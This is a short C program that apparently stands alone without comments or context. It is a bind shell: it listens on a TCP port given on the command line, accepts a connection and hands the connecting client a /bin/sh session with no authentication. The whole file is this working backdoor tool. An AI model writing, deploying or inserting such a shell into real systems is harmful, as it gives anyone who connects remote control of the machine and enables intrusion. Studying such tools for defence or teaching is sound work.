#include <sys/types.h>
#include <sys/socket.h>

#include <err.h>
#include <netdb.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

int
bind_try(struct addrinfo *p)
{
	int	fd, yes = 1;

	if ((fd = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1) {
		warn("socket");
		return (-1);
	}
	if (setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof yes) == -1)
		err(1, "setsockopt");
	if (bind(fd, p->ai_addr, p->ai_addrlen) == -1) {
		close(fd);
		warn("bind");
		return (-1);
	}

	return (fd);
}

int
main(int argc, char **argv)
{
	char			*exec_argv[] = { "/bin/sh", NULL };
	int		 	 ai_ret, fd, fd_client;
	socklen_t		 sl_client;
	struct addrinfo	 	 ai_hints;
	struct addrinfo		*ai_ptr, *ai_srv;
	struct sockaddr_storage	 sa_client;

	if (argc != 2)
		errx(1, "usage: port");

	memset(&ai_hints, 0, sizeof ai_hints);
	ai_hints.ai_family = AF_UNSPEC;
	ai_hints.ai_socktype = SOCK_STREAM;
	ai_hints.ai_flags = AI_PASSIVE;

	if ((ai_ret = getaddrinfo(NULL, argv[1], &ai_hints, &ai_srv)) != 0)
		errx(1, "getaddrinfo: %s", gai_strerror(ai_ret));
	for (ai_ptr = ai_srv; ai_ptr != NULL; ai_ptr = ai_ptr->ai_next) {
		if ((fd = bind_try(ai_ptr)) != -1)
			break;
	}
	if (ai_ptr == NULL)
		errx(1, "failed to bind");
	freeaddrinfo(ai_srv);
	sl_client = sizeof sa_client; 

	if (listen(fd, 5) == 1)
		err(1, "listen");
	fd_client = accept(fd, (struct sockaddr *) &sa_client, &sl_client);
	if (fd_client == -1)
		err(1, "accept");

	if (dup2(fd_client, STDIN_FILENO) == -1)
		err(1, "dup2");
	if (dup2(fd_client, STDOUT_FILENO) == -1)
		err(1, "dup2");
	if (dup2(fd_client, STDERR_FILENO) == -1)
		err(1, "dup2");

	execve(exec_argv[0], exec_argv, NULL);
	err(1, "execve");

	return (0);	/* NOTREACHED */
}
